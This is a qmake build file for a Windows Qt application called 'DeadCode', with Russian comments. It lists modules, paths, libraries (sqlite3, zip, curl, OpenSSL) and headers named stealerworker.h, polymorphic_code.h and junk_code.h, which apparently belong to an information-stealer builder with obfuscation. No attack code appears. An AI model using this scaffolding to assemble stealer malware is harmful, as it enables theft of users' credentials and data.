# Основные модули Qt (синхронизированы с build.yml)
QT += core gui network widgets qml quick svg quickcontrols2 sql

# Проверка минимальной версии Qt
lessThan(QT_MAJOR_VERSION, 5) | lessThan(QT_MINOR_VERSION, 15) {
    error("Qt 5.15.2 or higher is required. Current version: $$QT_VERSION")
}

# Имя цели и тип приложения
TARGET = DeadCode
TEMPLATE = app

# Конфигурация для релиза
CONFIG += release qtquickcompiler

# Исходные файлы
SOURCES += \
    src/main.cpp \
    ui/mainwindow.cpp

# Заголовочные файлы
HEADERS += \
    ui/mainwindow.h \
    src/build_key.h \
    src/polymorphic_code.h \
    src/junk_code.h \
    src/stealerworker.h \
    src/compat.h

# Формы Qt Designer
FORMS += \
    ui/mainwindow.ui

# Файл ресурсов
RC_FILE = icon.rc

# Пути для поиска заголовков
VCPKG_ROOT = C:/vcpkg
!exists($$VCPKG_ROOT/installed/x64-mingw-dynamic/include) {
    error("vcpkg include directory not found: $$VCPKG_ROOT/installed/x64-mingw-dynamic/include")
}

QT_ROOT = C:/Qt/5.15.2/mingw81_64
!exists($$QT_ROOT/include) {
    error("Qt directory not found: $$QT_ROOT/include")
}

INCLUDEPATH += \
    src \
    ui \
    $$VCPKG_ROOT/installed/x64-mingw-dynamic/include \
    $$QT_ROOT/include

# Пути для поиска QML-модулей
QML_IMPORT_PATH += \
    $$QT_ROOT/qml

# Библиотеки для линковки (синхронизированы с vcpkg)
VCPKG_LIB_DIR = $$VCPKG_ROOT/installed/x64-mingw-dynamic/lib
!exists($$VCPKG_LIB_DIR) {
    error("vcpkg library directory not found: $$VCPKG_LIB_DIR")
}

LIBS += \
    -L$$VCPKG_LIB_DIR \
    -lsqlite3 \
    -lzip \
    -lzlib \
    -lbz2 \
    -lcurl \
    -lssl \
    -lcrypto

# Флаги компилятора
QMAKE_CXXFLAGS += \
    -O2 \
    -std=c++17 \
    -Wall \
    -Wextra \
    -Wshadow \
    -Wunused \
    -Werror=return-type \
    -DUNICODE \
    -D_UNICODE \
    -DWIN32 \
    -DQT_NO_DEBUG

# Флаги линковщика
QMAKE_LFLAGS += \
    -O2 \
    -Wl,-subsystem,windows

# Директории для сборки
DESTDIR = build/release
OBJECTS_DIR = build/release/obj
MOC_DIR = build/release/moc
UI_DIR = build/release/ui
RCC_DIR = build/release/rcc

# Расширенный список файлов для очистки
QMAKE_CLEAN += \
    $$DESTDIR/DeadCode.exe \
    $$OBJECTS_DIR/*.o \
    $$OBJECTS_DIR/*.obj \
    $$MOC_DIR/moc_*.cpp \
    $$UI_DIR/ui_*.h \
    $$RCC_DIR/qrc_*.cpp \
    $$DESTDIR/Makefile* \
    $$DESTDIR/*.ilk \
    $$DESTDIR/*.pdb

# Зависимости для пересборки
PRE_TARGETDEPS += \
    src/build_key.h \
    src/polymorphic_code.h \
    src/junk_code.h \
    src/stealerworker.h \
    src/compat.h \
    $$UI_DIR/ui_mainwindow.h